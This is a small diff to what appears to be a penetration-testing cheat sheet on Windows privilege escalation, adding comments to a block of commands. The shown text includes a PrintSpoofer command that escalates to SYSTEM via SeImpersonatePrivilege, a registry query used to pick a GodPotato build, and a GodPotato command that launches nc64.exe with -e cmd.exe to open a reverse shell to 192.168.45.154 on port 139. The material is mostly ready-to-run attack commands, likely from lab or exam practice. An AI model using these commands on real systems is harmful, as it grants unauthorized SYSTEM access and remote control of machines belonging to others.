@@ -179,9 +179,9 @@
 1. From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.:   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
 2. From Local user & .NET version: https://github.com/BeichenDream/GodPotato (Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11)
    ``` 
-   
+   // check use which godpotato version
    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" 
-   
+   // rev shell
    .\GodPotato-NET4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.154 139 -e cmd.exe" 
 
    ```
